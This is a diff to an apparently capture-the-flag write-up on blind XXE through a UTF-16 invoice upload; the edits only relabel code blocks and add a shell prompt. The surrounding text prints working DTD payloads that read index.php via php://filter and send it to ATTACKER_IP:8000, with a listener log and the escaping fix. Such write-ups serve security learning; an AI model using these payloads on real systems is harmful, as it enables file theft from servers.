@@ -189,7 +189,8 @@ Verified visually with `xxd`:
 Uploading the UTF-16 version returned `Received. Your invoice was queued for review.` and the invoice `ID` field came back **empty** — because `&canary;` resolved to nothing (the requested file didn't exist), proving entity substitution had occurred server-side. The listener confirmed the outbound request:
 
 ```bash
-python3 -m http.server 8000
+┌──(kuroshiro㉿a1sberg)-[~/Webverse/Remit]
+└─$ python3 -m http.server 8000
 # 10.8.0.1 - - "GET /canary.txt HTTP/1.1" 404 -
 ```
 
@@ -240,7 +241,7 @@ This confirmed: blacklist bypassed, external entity expansion enabled, blind XXE
 >
 > The working three-line DTD does the following, read top to bottom:
 >
-> ```dtd
+> ```xml
 > <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/proc/self/cwd/index.php">
 > <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:8000/leak?d=%file;'>">
 > %eval;
@@ -312,7 +313,7 @@ Because the invoice `<ID>` field is small and not directly visible, out-of-band 
 
 Initial DTD used a general entity for the leak step, which only resolves if referenced inside the document body:
 
-```dtd
+```xml
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/proc/self/cwd/index.php">
 <!ENTITY % stage "<!ENTITY leak SYSTEM 'http://ATTACKER_IP:8000/leak?d=%data;'>">
 %stage;
@@ -324,7 +325,7 @@ Result: the DTD itself was fetched (`GET /exfil.dtd` → 200), but no `/leak` ca
 
 The fix: make the inner entity a **parameter entity** (`%leak`, not `leak`), escape the `%` as `&#x25;` so the parser doesn't prematurely expand it while building the outer entity's replacement text, and add an explicit trigger reference at the end:
 
-```dtd
+```xml
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/proc/self/cwd/index.php">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:8000/leak?d=%file;'>">
 %eval;
